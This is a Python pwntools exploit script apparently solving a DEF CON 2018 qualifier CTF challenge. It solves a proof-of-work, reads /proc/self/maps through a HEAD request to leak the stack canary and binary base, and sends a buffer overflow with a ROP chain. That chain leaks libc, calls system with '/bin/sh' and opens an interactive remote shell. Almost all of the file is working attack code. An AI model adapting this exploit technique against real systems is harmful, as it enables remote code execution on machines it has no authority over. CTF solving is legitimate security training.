#!/usr/bin/env python
from __future__ import print_function
import sys
import struct
import hashlib
from pwn import *

# inspired by C3CTF's POW

def pow_hash(challenge, solution):
    return hashlib.sha256(challenge.encode('ascii') + struct.pack('<Q', solution)).hexdigest()

def check_pow(challenge, n, solution):
    h = pow_hash(challenge, solution)
    return (int(h, 16) % (2**n)) == 0

def solve_pow(challenge, n):
    candidate = 0
    while True:
        if check_pow(challenge, n, candidate):
            return candidate
        candidate += 1

if __name__ == '__main__':
#    challenge = sys.argv[1]
#    n = int(sys.argv[2])

#    print('Solving challenge: "{}", n: {}'.format(challenge, n))

#    solution = solve_pow(challenge, n)
#    print('Solution: {} -> {}'.format(solution, pow_hash(challenge, solution)))
	
    r = remote("cee810fa.quals2018.oooverflow.io",31337)
    r.recvuntil("Challenge: ")
    challenge = r.recvline()[:-1]
    r.recvuntil("n: ")
    n = int(r.recvline()[:-1])
    print('Solving challenge: "{}", n: {}'.format(challenge, n))

    solution = solve_pow(challenge, n)
    print('Solution: {} -> {}'.format(solution, pow_hash(challenge, solution)))
    r.sendlineafter("Solution:",str(solution))
	
    r.recvuntil("requests")
    r.recvline()
    r.sendline("HEAD /proc/self/maps")
    r.recvline()
    a =""
    b = ""
    for i in range(7):
            data = r.recvline()
            if "r-xp" in data:
                    if "ld" in data:
                            a = data.split("-")[0]
                    else:
                            b = data.split("-")[0]

    canary = int(a[:-3]+b[:-3]+"00",16)
    print( hex(canary))
    text = int(b,16)
    print( hex(text))
    payload = "a"*0x58+p64(canary)+p64(text+0x202100)+p64(text+0x10b3)
    payload += p64(text+0x202020)+p64(text+0x9e0)+p64(text+0x10aa)
    context.arch = "amd64"
    payload+= flat([0x0,0x1,text+0x202060,0x100,text+0x202a00,0x0,text+0x1090],[0x0,0x0,text+0x202a00,0x0,0x0,0x0,0x0],[text+0xc89])
    print( hex(text+0x1090))
    r.send(payload[:-1])
    r.recvline()
    libc = u64(r.recvline()[:-1].ljust(8,'\x00'))-0x6f690
    print( hex(libc))
    payload2 = flat([0x0,text+0x10aa,0x0,0x1,text+0x202060,0x16,text+0x202020,0x0,text+0x1090],[0x0]*7,[text+0x10b3,text+0x202028,text+0x9e0])
    r.send(payload2.ljust(0x100,'\x00'))
    r.send(p64(libc+0x45390)+"/bin/sh\x00")
    r.interactive()
